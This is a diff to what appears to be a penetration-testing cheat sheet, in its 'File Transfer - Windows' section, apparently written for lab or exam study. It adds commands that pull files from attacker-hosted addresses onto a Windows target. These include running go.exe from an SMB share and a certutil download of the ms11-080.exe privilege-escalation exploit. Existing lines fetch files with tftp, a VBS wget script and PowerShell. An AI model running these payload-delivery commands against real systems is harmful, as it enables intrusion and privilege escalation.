@@ -41,9 +41,19 @@ Dir \\192.168.1.48\sharez
 
 
 # File Transfer - Windows
+#### tftp
 ``tftp -i 10.11.0.185 GET test.txt``
 
+#### smb
+```
+Dir \\192.168.1.48\sharez
+\\192.168.1.48\sharez\go.exe
+```
+
+#### http - 
 ```cscript wget.vbs http://10.11.0.158/ms11-080.exe -O C:\lec\ms11-080.exe```
+
+```certutil -urlcache -split -f "http://10.11.0.158/ms11-080.exe" C:\temp\ms11-080.exe```
 #### Powershell 2
 ```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe", "C:\lec\accesschk.exe")```
 
